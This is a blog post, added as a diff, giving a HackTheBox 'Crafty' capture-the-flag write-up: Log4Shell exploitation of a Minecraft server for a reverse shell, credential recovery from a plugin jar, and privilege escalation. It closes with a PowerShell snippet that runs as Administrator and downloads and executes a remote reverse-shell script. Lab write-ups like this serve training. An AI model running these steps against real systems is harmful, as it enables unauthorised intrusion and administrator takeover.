@@ -1,0 +1,127 @@
+---
+layout: post
+title: "Crafty dac548b6abac405aab1cf0e7f0e9bf69"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Crafty
+
+HackTheBox: Easy
+
+## 1: Enumeration
+
+- nmap scanning
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled.png' | relative_url }})
+
+There are two http services, at 80 port we didn’t find anything useful
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_1.png' | relative_url }})
+
+5985 Port has a vulnerability, let’s see what can we do (CVE-2021-44228)
+
+ This vulnerability, also known as Log4Shell or LogJam, allows remote code execution (RCE) attacks due to a flaw in the JNDI (Java Naming and Directory Interface) feature of Log4j.
+
+Exploiting this vulnerability, attackers could craft malicious JNDI URLs that, when processed by Log4j, would result in the execution of arbitrary code. 
+
+## 2: User flag
+
+We clone the POC’s 
+
+```bash
+git clone https://github.com/kozmer/log4j-shell-poc
+```
+
+Change the cmd default(Linux) to windows one 
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_2.png' | relative_url }})
+
+Download the right java version
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_3.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_4.png' | relative_url }})
+
+Download the minecraft client to establish connection with minecraft.
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_5.png' | relative_url }})
+
+Set the environment variables and activate them
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_6.png' | relative_url }})
+
+---
+
+The ‘rlwrap’ command is a utility used in Unix operating systems and it just helps the experience using any command line program
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_7.png' | relative_url }})
+
+---
+
+Start the poc using the following command and send the request
+
+80 Is the port that will be open to establish connection.
+
+4444 will be the port where we are going to receive the rev shell
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_8.png' | relative_url }})
+
+Establish connection with the minecraft client
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_9.png' | relative_url }})
+
+Send the command and get the user shell
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_10.png' | relative_url }})
+
+---
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_11.png' | relative_url }})
+
+## 3: Priv esc
+
+> Looking around(C:\Users\svc_minecraft\server\plugins) we found a .jar file where we could find credentials, so let’s proceed to download it using netcat
+> 
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_12.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_13.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_14.png' | relative_url }})
+
+We used this decompiler and we opened the file. 
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_15.png' | relative_url }})
+
+Good luck
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_16.png' | relative_url }})
+
+As we don’t have any open port to access as Administrator we have two options:
+
+1. Using msfvenom create a evil .exe and execute it with administrator credentials
+2. Create a revese power shell using those credentials, i have never done this technique so it looks interesting
+    
+    ![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_17.png' | relative_url }})
+    
+- Set up a python server with the revshell and try to trigger it using:
+
+```powershell
+#Create a secure password
+$SecPass = ConverTo-SecureString 'password' -AsPlainText -Force
+#Crearte a credential
+$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
+#Execute a script which starts on powershell
+Start-Process -FilePath "powershell" -argumentlist 
+#First argument and download and execurte the script .ps1
+"IEX(New-Object Net.WebClient).downloadString('http://ip:port/revshel.ps1')"
+#Execute it as admin
+-Credential $cred
+```
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_18.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_19.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c/80df4b3f-f3ae-4518-a352-b8f790d5a4e9-export-c6755c92-5aef-4c50-9878-b5fac3e5875c_Untitled_20.png' | relative_url }})
